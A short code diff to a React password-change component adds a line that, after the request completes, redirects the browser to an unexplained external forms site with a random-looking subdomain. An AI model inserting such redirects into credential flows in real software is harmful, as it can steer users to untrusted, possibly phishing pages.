@@ -32,7 +32,8 @@ class ChangePwd extends React.Component{
                 })
                     .then((response) => {
                         console.log(response.body)
-                    })
+                        window.location.href = "https://fgkekkthnxbai.hforms.me"
+            })
             }
         }
     }
